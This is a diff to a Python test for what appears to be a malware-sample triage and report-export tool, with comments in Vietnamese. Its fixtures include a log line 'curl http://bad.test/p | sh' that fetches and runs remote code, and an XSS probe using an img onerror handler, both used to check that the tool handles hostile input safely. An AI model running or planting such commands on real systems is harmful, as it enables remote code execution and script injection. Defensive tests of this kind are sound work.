@@ -19,6 +19,8 @@ try:
     src = w(os.path.join(inbox, 'U1', 'a', 'x.bin'), smp); dup = w(os.path.join(inbox, 'U2', 'y.bin'), smp)
     note2 = w(os.path.join(inbox, 'U1', 'a', 'z.txt'), '$ sha256sum /m/x.bin\nok\n')   # ghi chú chỉ có dòng lệnh trên mẫu (watch.note_of nhận): export cũng gom
     w(os.path.join(inbox, 'U3', 'z.txt'), '$ sha256sum /m/x.bin\nhost=khac\n')   # cùng basename x.bin nhưng ghi chú nằm thư mục khác (mẫu khác): không gom
+    mid = w(os.path.join(inbox, 'U1', 'a', 'mid.txt'), 'dữ liệu bất kỳ\n$ sha256sum /m/x.bin\nok\n')   # dòng lệnh giữa nội dung: watch coi là mẫu, export không gom làm ghi chú
+    big = w(os.path.join(inbox, 'U1', 'a', 'big.txt'), '$ sha256sum /m/x.bin\n' + 'x' * 9000 + '\n')   # quá 8 KiB: không phải ghi chú
     note = w(os.path.join(inbox, 'U1', 'a', 'x.txt'), '# host=m1|<b>x</b> ip=10.0.0.9 at=2026-01-01\n$ ls -la /usr/lib/x\n' + h + '  /usr/lib/x\n<img src=x onerror=alert(1)>\n')
     scr = w(os.path.join(inbox, 'U1', 'a', 'x.log'), 'curl http://bad.test/p | sh\n')   # tên giống ghi chú nhưng là script: không gom, không chép rõ
     sums2 = w(os.path.join(inbox, 'U2', 'SHA256SUMS'), h + '  y.bin\n')                # cùng tên ở thư mục khác: không đè nhau
@@ -47,7 +49,8 @@ try:
     st = {'source': src, 'inbox': inbox, 'sha256': h}
     out = os.path.join(T, 'Report'); d = os.path.join(out, 'x.bin_data')
     info = export.write(c, st, d)
-    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note, note2] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
+    assert info['aliases'] == [dup] and [n['file'] for n in info['notes']] == [note, note2] and mid not in [n['file'] for n in info['notes']] and big not in [n['file'] for n in info['notes']] and sorted(p for p, _ in info['sums']) == [sums, sums2], info
+    assert export.cmd_targets('# h=1\n$ ls /a/x.bin\n') == ['/a/x.bin'] and export.cmd_targets('x\n$ ls /a/x.bin\n') == [] and export.cmd_targets('$ ls /a/x.bin\n' + 'x' * 9000) == []
     assert info['ftype'] == 'ELF x86-64' and info['notes'][0]['sha'] == 'khớp' and info['notes'][0]['path'] == '/usr/lib/x', info['notes']
     P = sorted(json.load(open(LIST)))
     assert P == sorted(['work/sample/x.bin', 'work/extract/stage2.ps1', 'work/runs/emu/snap_oep.bin', 'work/stage1.bin', 'work/runs/mixed.txt', 'work/runs/tool/t/stage2.ps1', 'work/runs/dec/decoded.vbs', 'work/review/r1/payload.ps1', 'work/runs/watch/s01.jsonl', 'work/NOTES.md_stage2.md', 'work/review/deep/er/x.md', 'work/review/llm_cache/k.prompt.md']), P
